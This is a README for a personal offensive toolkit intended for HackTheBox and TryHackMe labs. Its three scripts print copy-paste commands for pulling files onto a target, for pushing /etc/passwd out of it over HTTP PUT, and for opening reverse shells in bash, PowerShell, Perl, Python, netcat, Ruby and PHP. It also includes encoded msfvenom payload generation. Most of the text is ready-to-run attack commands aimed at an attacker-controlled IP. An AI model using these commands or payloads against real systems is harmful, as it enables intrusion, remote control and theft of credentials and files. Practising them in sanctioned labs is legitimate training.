# htb-scripts

Scripts I wrote for hacking HackTheBox machines or TryHackMe machines.

All the scripts will take `tun0` tunnel IP by default, as HackTheBox and TryHackMe both requires VPN connection into their network in order to hack their machines.

## Installation

You can git clone this repository in any directory you choose, then modify your path to include it.

For example, I will be installing the scripts to `~/tools/bin` directory, and update my `~/.zshrc` file to include th path. If you're using bash, change the target to `~/.bashrc`

```
git clone https://github.com/the-c0d3r/htb-scripts ~/tools/bin
echo 'export PATH=~/tools/bin:$PATH' >> ~/.zshrc
source ~/.zshrc
```


## srvfile

```
Usage

srvfile file_to_serve
```

This is short for "serve file". Assume you want to serve this file called `nc.exe` to your target host, you would do the following command.

```
$ srvfile nc.exe

=== LINUX
curl http://10.10.10.10/nc.exe -o nc.exe

wget http://10.10.10.10/nc.exe

=== WINDOWS
powershell -ep bypass -c "$wc=New-Object Net.WebClient;$wc.DownloadFile('http://10.10.10.10/nc.exe','c:\temp\nc.exe');"

certutil -urlcache -f http://10.10.10.10/nc.exe nc.exe

Copy paste one of the command above to your reverse shell on the target to download files.
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
The script then gives you a templated command that you can just copy paste to the target through your command execution vector, for both Linux and Windows. Then it will automatically host the python3 simple http server on the port 80.

Once you run the command on your target, it will download the file that is being served from your machine.

## putsrv

Sometimes you might need to upload file from the target machine to your kali machine. This script is made for that purpose. It will run a python HTTP PUT server and provide you command to just copy paste from the target to upload file to your machine.

```
Usage: putsrv file_to_put_from_server path_to_put_on_local
e.g.:  putsrv /etc/passwd .
```
First argument is the file to upload from target, second argument is the path to be uploaded on your machine.
In this example, I want to upload `/etc/passwd` from the target machine that I am exploiting.

```
$ putsrv /etc/passwd .
IP Detected: 10.10.10.10
File to PUT: /etc/passwd
Path to PUT: /mnt/hgfs/tools/serve/shell



=== LINUX
curl -X PUT --upload-file /etc/passwd http://10.10.10.10/


wget -O- --method=PUT --body-file=/etc/passwd http://10.10.10.10/



=== WINDOWS
powershell -ep bypass -c "$wc=New-Object Net.WebClient;$wc.UploadFile('http://10.10.10.10/', 'PUT', '/etc/passwd');"


--------------------------------
Copy the command above and paste it in your reverse shell to upload the file.

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

The script then give you the command to be copy pasted on the target machine to upload the file to your own machine, and startup the http server. It supports both Linux and Windows.

Once you run the command on your target, the file will be uploaded from your target to your machine, on the path you specified.


## shgen

This is short for "shell generator". This script is to be used for generating reverse shell commands to be executed on the target with the command execution vectors.

```
Usage: shgen <PORT>
```

There is only one argument necessary for this script, the PORT for the reverse shell to connect back to. So for example, if you want to have reverse shell code to connect back on port 8080, you would execute the following.

```
$ shgen 8080
   _____ __         ____      ______
  / ___// /_  ___  / / /     / ____/__  ____
  \__ \/ __ \/ _ \/ / /_____/ / __/ _ \/ __ \
 ___/ / / / /  __/ / /_____/ /_/ /  __/ / / /
/____/_/ /_/\___/_/_/      \____/\___/_/ /_/


 Author  the-c0d3r

=== BASH
bash -i >& /dev/tcp/10.10.10.10/8080 0>&1

=== PowerShell
$ip='10.10.10.10';$port=8080;$client = New-Object System.Net.Sockets.TCPClient($ip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

=== Pearl
perl -e 'use Socket;$i="10.10.10.10";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(,inet_aton()))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

=== Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

=== nc
nc.exe 10.10.10.10 8080 -e cmd.exe
nc -e /bin/sh 10.10.10.10 8080
rm /tmp/zero8080;mkfifo /tmp/zero8080;cat /tmp/zero8080|/bin/sh -i 2>&1|nc 10.10.10.10 8080 >/tmp/zero8080

=== Ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

=== Php
php -r '$sock=fsockopen("10.10.10.10",8080);exec("/bin/sh -i <&3 >&3 2>&3");'

==========================

=== MSF Venom Payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=8080 -f exe > shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=8080 -f exe -e x86/shikata_ga_nai -i 8 > shell.exe

non-staged linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=8080 -f elf > shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=8080 -f elf > shell.elf
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=8080 -f elf > shell.elf
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=8080 -f elf > shell.elf

=== WEB
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=8080 -f asp > shell.asp
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=8080 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=8080 -f raw > shell.jsp
---
Running nc reverse shell handler
Hack away
listening on [any] 8080 ...

```

It will then generate a list of reverse shell commands for you to copy paste to the target machine to return a reverse shell. And at the same time, it will spawn a "nc" listener.

You can very easily add new reverse shell templates that you usually use. With this, you don't have to keep looking up what is your IP, and what payload you want. You simply specify port and it will take care of the rest.

